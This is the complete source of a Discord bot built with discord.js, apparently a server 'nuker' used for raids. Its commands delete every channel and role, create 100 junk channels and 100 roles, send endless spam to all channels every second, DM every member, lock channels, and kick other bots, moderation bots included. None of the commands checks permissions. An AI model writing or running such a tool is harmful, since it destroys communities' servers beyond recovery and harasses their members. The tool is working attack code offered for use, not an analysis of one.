const { Client, Partials, GatewayIntentBits } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ],
    partials: [Partials.Channel]
});

const prefix = ".";
let isFrozen = false;

client.on('ready', () => {
    console.log(`${client.user.tag} active and ready!`);
});

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(prefix)) return;

    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (isFrozen && command !== 'unfreeze') {
        return message.channel.send('❌ Bot is frozen. Use `.unfreeze` to re-enable commands.');
    }

    // 0. HELP
    if (command === 'help') {
        const helpEmbed = {
            title: '📋 BOT COMMANDS',
            description: 'List of all available commands:',
            color: 0x00ff00,
            fields: [
                { name: '`.nuke`', value: 'Deletes ALL channels and ALL roles, then creates 100 channels named "zwox 1" through "zwox 100".' },
                { name: '`.sp`', value: 'Sends unlimited spam to ALL text channels every 1 second.\nUsage: `.sp <message_text>`' },
                { name: '`.ch`', value: 'Creates 100 text channels with name + number.\nUsage: `.ch <name>`' },
                { name: '`.rl`', value: 'Creates 100 new roles with random colors.\nUsage: `.rl [role_name]`' },
                { name: '`.vc`', value: 'Creates a new category "locked & zwox" with 50 voice channels named "zwox 1" to "zwox 50".' },
                { name: '`.davet`', value: 'Creates a permanent invite link and sends it to your DMs.' },
                { name: '`.serverinfo`', value: 'Shows detailed server info.' },
                { name: '`.name`', value: 'Changes server name.\nUsage: `.name <new_name>`' },
                { name: '`.freeze`', value: 'Freezes the bot instantly.' },
                { name: '`.unfreeze`', value: 'Unfreezes the bot.' },
                { name: '`.mesaj`', value: 'Sends a message to EVERY member.\nUsage: `.mesaj <message_text>`' },
                { name: '`.lock`', value: 'Disables send permission for @everyone in ALL text channels.' },
                { name: '`.unlock`', value: 'Enables send permission for @everyone in ALL text channels.' },
                { name: '`.status`', value: 'Changes bot\'s playing status.\nUsage: `.status <new_status>`' },
                { name: '`.del`', value: 'Deletes ALL webhooks and kicks ALL bots from the server (excluding itself).' },
                { name: '`.help`', value: 'Shows this help message.' }
            ],
            footer: { text: '⚠️ Destructive commands cannot be undone' }
        };
        return message.channel.send({ embeds: [helpEmbed] });
    }

    // 1. NUKE
    if (command === 'nuke') {
        await message.delete().catch(() => {});
        const guild = message.guild;

        const channelPromises = guild.channels.cache.map(channel => channel.delete().catch(() => {}));
        await Promise.all(channelPromises);

        const rolePromises = guild.roles.cache.map(role => role.delete().catch(() => {}));
        await Promise.all(rolePromises);

        const createPromises = [];
        for (let i = 1; i <= 100; i++) {
            createPromises.push(guild.channels.create({ name: `zwox ${i}`, type: 0 }).catch(() => {}));
        }
        await Promise.all(createPromises);
    }

    // 2. SPAM
    if (command === 'sp') {
        const text = args.join(' ');
        if (!text) return;
        await message.delete().catch(() => {});
        setInterval(() => {
            message.guild.channels.cache.filter(c => c.type === 0).forEach(channel => {
                channel.send(text).catch(() => {});
            });
        }, 1000);
    }

    // 3. CREATE CHANNELS
    if (command === 'ch') {
        const baseName = args.join('-') || "channel";
        const promises = [];
        for (let i = 1; i <= 100; i++) {
            promises.push(message.guild.channels.create({ name: `${baseName}${i}`, type: 0 }).catch(() => {}));
        }
        await Promise.all(promises);
    }

    // 4. CREATE ROLES
    if (command === 'rl') {
        const roleName = args.join(' ') || "HELLO";
        const promises = [];
        for (let i = 0; i < 100; i++) {
            promises.push(message.guild.roles.create({ name: roleName, color: 'Random', reason: 'Mass role creation' }).catch(() => {}));
        }
        await Promise.all(promises);
    }

    // 5. SERVER INFO
    if (command === 'serverinfo') {
        const guild = message.guild;
        const embed = {
            title: `📊 Server Info: ${guild.name}`,
            color: 0x00aaff,
            fields: [
                { name: 'Server Name', value: guild.name, inline: true },
                { name: 'Server ID', value: guild.id, inline: true },
                { name: 'Owner', value: `<@${guild.ownerId}>`, inline: true },
                { name: 'Member Count', value: `${guild.memberCount}`, inline: true },
                { name: 'Channels', value: `${guild.channels.cache.size}`, inline: true },
                { name: 'Roles', value: `${guild.roles.cache.size}`, inline: true },
                { name: 'Created At', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:F>`, inline: false }
            ],
            timestamp: new Date().toISOString()
        };
        return message.channel.send({ embeds: [embed] });
    }

    // 6. CHANGE NAME
    if (command === 'name') {
        const newName = args.join(' ');
        if (!newName) return message.channel.send('❌ Usage: `.name <new_name>`');
        await message.delete().catch(() => {});
        await message.guild.setName(newName)
            .then(() => message.channel.send(`✅ Server name changed to: **${newName}**`))
            .catch(() => message.channel.send('❌ Failed.'));
    }

    // 7. FREEZE
    if (command === 'freeze') {
        isFrozen = true;
        await message.delete().catch(() => {});
        return message.channel.send('❄️ Bot frozen.');
    }

    // 8. UNFREEZE
    if (command === 'unfreeze') {
        isFrozen = false;
        await message.delete().catch(() => {});
        return message.channel.send('✅ Bot unfrozen.');
    }

    // 9. MESAJ
    if (command === 'mesaj') {
        const text = args.join(' ');
        if (!text) return message.channel.send('❌ Usage: `.mesaj <message_text>`');
        await message.delete().catch(() => {});
        const guild = message.guild;
        let sentCount = 0;
        let failCount = 0;

        await guild.members.fetch();
        const allMembers = guild.members.cache;

        for (const [memberId, member] of allMembers) {
            if (member.user.bot) continue;
            try {
                await member.send(text);
                sentCount++;
            } catch {
                failCount++;
            }
        }

        return message.channel.send(`✅ Sent to ${sentCount} members. Failed: ${failCount}`);
    }

    // 10. VOICE CHANNELS
    if (command === 'vc') {
        await message.delete().catch(() => {});
        const guild = message.guild;

        const category = await guild.channels.create({
            name: 'locked & zwox',
            type: 4
        }).catch(() => null);

        if (!category) {
            return message.channel.send('❌ Failed to create category.');
        }

        const promises = [];
        for (let i = 1; i <= 50; i++) {
            promises.push(
                guild.channels.create({
                    name: `zwox ${i}`,
                    type: 2,
                    parent: category.id
                }).catch(() => {})
            );
        }
        await Promise.all(promises);

        return message.channel.send('✅ Created category "locked & zwox" with 50 voice channels.');
    }

    // 11. DAVET
    if (command === 'davet') {
        await message.delete().catch(() => {});
        const guild = message.guild;

        try {
            const invite = await guild.invites.create(guild.channels.cache.find(c => c.type === 0), {
                maxAge: 0,
                maxUses: 0
            });
            await message.author.send(`🔗 Server invite link: ${invite.url}`);
            return message.channel.send('✅ Invite link sent to your DMs.');
        } catch (error) {
            return message.channel.send('❌ Failed to create invite.');
        }
    }

    // 12. LOCK
    if (command === 'lock') {
        await message.delete().catch(() => {});
        const guild = message.guild;
        const everyoneRole = guild.roles.everyone;

        const promises = guild.channels.cache
            .filter(c => c.type === 0)
            .map(channel => {
                return channel.permissionOverwrites.edit(everyoneRole, {
                    SendMessages: false
                }).catch(() => {});
            });

        await Promise.all(promises);
        return message.channel.send('🔒 All text channels locked. @everyone cannot send messages.');
    }

    // 13. UNLOCK
    if (command === 'unlock') {
        await message.delete().catch(() => {});
        const guild = message.guild;
        const everyoneRole = guild.roles.everyone;

        const promises = guild.channels.cache
            .filter(c => c.type === 0)
            .map(channel => {
                return channel.permissionOverwrites.edit(everyoneRole, {
                    SendMessages: null
                }).catch(() => {});
            });

        await Promise.all(promises);
        return message.channel.send('🔓 All text channels unlocked. @everyone can send messages.');
    }

    // 14. STATUS
    if (command === 'status') {
        const newStatus = args.join(' ');
        if (!newStatus) return message.channel.send('❌ Usage: `.status <new_status>`');
        await message.delete().catch(() => {});
        client.user.setActivity(newStatus);
        return message.channel.send(`✅ Status changed to: **${newStatus}**`);
    }

    // 15. DEL
    if (command === 'del') {
        await message.delete().catch(() => {});
        const guild = message.guild;
        let webhookCount = 0;
        let botKickCount = 0;

        const webhooks = await guild.fetchWebhooks().catch(() => []);
        for (const webhook of webhooks.values()) {
            await webhook.delete().catch(() => {});
            webhookCount++;
        }

        const members = await guild.members.fetch();
        for (const [id, member] of members) {
            if (member.user.bot && member.id !== client.user.id) {
                try {
                    await member.kick('Bot cleanup');
                    botKickCount++;
                } catch {}
            }
        }

        return message.channel.send(`✅ Deleted ${webhookCount} webhooks. Kicked ${botKickCount} bots (self excluded).`);
    }
});

// Token'ı Railway Variables içerisinden çekecek şekilde ayarlandı
client.login(process.env.TOKEN);
